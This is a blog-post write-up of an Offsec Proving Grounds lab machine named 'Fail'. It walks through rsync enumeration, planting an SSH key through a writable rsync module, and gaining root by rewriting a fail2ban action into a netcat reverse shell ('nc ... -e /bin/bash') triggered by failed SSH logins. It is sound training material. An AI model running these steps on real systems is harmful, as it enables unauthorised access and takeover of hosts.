---
title: "Proving grounds Practice: Fail"
layout: post
date: 2023-12-30 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- Rsync
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 873/tcp open  rsync (protocol version 31)

List `rsync` modules using nmap.

```sh
naveenj@hackerspace:|01:49|~/proving_grounds/Fail$ nmap -sV --script "rsync-list-modules" -p 873 192.168.195.126
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-20 01:50 EDT
Nmap scan report for 192.168.195.126
Host is up (0.28s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox            	fox home
```

**Rsync Enumeration**

```sh
naveenj@hackerspace:|01:52|~/proving_grounds/Fail$ rsync -av --list-only rsync://192.168.195.126/
fox            	fox home

naveenj@hackerspace:|01:53|~/proving_grounds/Fail$ rsync -av --list-only rsync://192.168.195.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile
```

Upload .ssh directory with our SSH public key as authorized_keys

```sh
naveenj@hackerspace:|02:12|~/proving_grounds/Fail$ rsync -av .ssh/ rsync://fox@192.168.195.126/fox/.ssh
sending incremental file list
created directory /.ssh
./
authorized_keys

sent 27,331 bytes  received 161 bytes  7,854.86 bytes/sec
total size is 26,861  speedup is 0.98
```

**.ssh Folder**

```sh
naveenj@hackerspace:|02:14|~/proving_grounds/Fail$ ll .ssh
total 48K
4.0K drwxr-xr-x 3 naveenj naveenj 4.0K Oct 20 02:12 ../
4.0K -rw-r--r-- 1 naveenj naveenj  573 Oct 20 01:56 authortized_keys
```

SSH to user fox to obtain initial foothold.

## Privilege Escalation

Check user and group id

```sh
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

## Fail2ban Privilege Escalation

[https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)

The user can write permission to action.d folder and upon recon the fail2ban is enabled for the SSH service.

```conf
# Provide customizations in a jail.local file or a jail.d/customisation.local.
# For example to change the default bantime for all jails and to enable the
# ssh-iptables jail the following (uncommented) would appear in the .local file.
# See man 5 jail.conf for details.
#
# [DEFAULT]
# bantime = 1h
#
# [sshd]
# enabled = true
```

The default configuration says the host will be banned for a minute after 2 invalid attempts.

```conf
# "bantime" is the number of seconds that a host is banned.
bantime  = 1m

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10m

# "maxretry" is the number of failures before a host get banned.
maxretry = 2
```

Upon changing the config in the iptables-multiport.conf to a reverse shell.

```conf
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = /usr/bin/nc 192.168.45.247 80 -e /bin/bash
```

Run the netcat listener and try invalid ssh login attemps to trigger shell.

![img](/assets/images/CTF/Proving_Grounds/Fail/root.png)

**Root obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).